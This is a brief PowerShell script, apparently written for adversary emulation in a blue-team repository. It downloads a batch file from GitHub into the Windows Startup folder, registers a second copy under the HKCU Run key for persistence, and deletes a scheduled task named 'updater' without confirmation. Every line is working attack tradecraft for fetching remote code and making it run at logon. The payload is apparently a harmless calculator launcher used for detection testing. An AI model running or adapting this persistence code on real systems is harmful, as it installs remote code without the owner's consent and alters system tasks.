# StartUp Folder Persistence
Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startupPersistance.bat"

# Run Key Persistence
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$keyName = "Persistence"
Invoke-WebRequest -uri "https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/startCalc.bat" -OutFile "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
$calcPath = "$env:USERPROFILE\AppData\Local\Temp\startupPersistance.bat"
Set-ItemProperty -Path $registryPath -Name $keyName -Value $calcPath

# Delete Scheduled Task
Unregister-ScheduledTask -TaskName "updater" -Confirm:$false


